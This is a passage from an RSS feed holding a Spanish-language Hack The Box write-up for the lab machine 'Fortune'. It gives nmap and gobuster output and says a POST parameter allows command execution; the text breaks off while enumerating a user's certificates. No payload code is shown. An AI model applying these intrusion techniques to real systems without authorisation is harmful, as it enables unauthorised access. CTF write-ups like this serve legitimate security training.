            
              <category>steganography</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
            
              <category>linux</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Fortune</title>
        <link>https://sckull.github.io/posts/fortune/</link>
        <pubDate>Sat, 03 Aug 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 03 Aug 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/fortune/</guid>
        <description>Realizamos Command Injection en la pagina web lo que nos guió a certificados los cuales utilizamos para generar uno nuevo y acceder a una nueva pagina restringida, la que nos permitía generar claves SSH para Authpf, con este ultimo encontramos el puerto NFS que nos permitió obtener acceso por SSH.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Realizamos Command Injection en la pagina web lo que nos guió a certificados los cuales utilizamos para generar uno nuevo y acceder a una nueva pagina restringida, la que nos permitía generar claves SSH para Authpf, con este ultimo encontramos el puerto NFS que nos permitió obtener acceso por SSH. Finalmente encontramos y crackeamos un hash de una base de datos para escalar privilegios.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/178&#34;&gt;Fortune&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Other&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;50&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Insane&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.127&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/46317&#34;&gt;AuxSarge&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/46317&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[8.1, 7.7, 4.3, 5.7, 2.3],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[8, 9, 1, 9, 1],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Al realizar un escaneo con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Wed Mar 13 22:48:02 2019 as: nmap -sV -sC -A -o nmap.scan 10.10.10.127&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.127
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp  open  http       OpenBSD httpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: OpenBSD httpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Fortune
443/tcp open  ssl/https?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
No exact OS matches &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; host &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
TCP/IP fingerprint:
OS:SCAN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%E&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;3/13%OT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;22%CT&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%CU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40048%PV&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;2%DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;T%G&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%TM&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5C89893
OS:B%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;SEQ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;SP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;102%GCD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1%ISR&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10D%TI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;RD%CI&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;RI%TS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;22&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;OPS&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;O
OS:1&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%O2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%O3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNW6NNT11%O4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%
OS:O5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6NNT11%O6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNNT11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;WIN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;W1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W2&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W3&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W
OS:5&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%W6&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;ECN&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4000%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;M54DNNSNW6%CC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y
OS:%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;O%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AS%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T2&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T3&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;T4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S%F
OS:&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S+%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T6&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y
OS:%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;40%W&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%S&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;A%A&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;S%F&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;AR%O&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%RD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%Q&lt;span class=&#34;o&#34;&gt;=)&lt;/span&gt;T7&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;U1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Y%DF&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;FF%IPL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;38%UN&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0%RI
OS:PL&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RID&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G%RUD&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;G&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;IE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;N&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;https&#34;&gt;HTTPS&lt;/h1&gt;
&lt;p&gt;Al visitar la pagina nos encontramos con lo siguiente, por lo que no podemos hacer nada por ahora.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-19%2016-51-49.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
&lt;p&gt;Con gobuster encontramos la siguiente ruta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/fortune &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos firefox para ver las peticiones que hace cuando enviamos una solicitud a una de las opciones, en cada opcion si se hace una peticion este nos devuelve de manera aleatoria un mensaje.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-18%2015-20-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-18%2015-21-43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y encontramos que, al editar las peticiones (&lt;code&gt;POST db=fortunes&lt;/code&gt;), encontramos que podemos ejecutar comandos (RCE):&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/Screenshot%20from%202019-03-18%2015-23-21.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al realizar una enumeracion de carpeta y archivos encontramos en la carpeta del usuario &lt;code&gt;bob&lt;/code&gt; (&lt;code&gt;/home/bob/&lt;/code&gt;) certificados que pueden pertenecen a la pagina web https.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
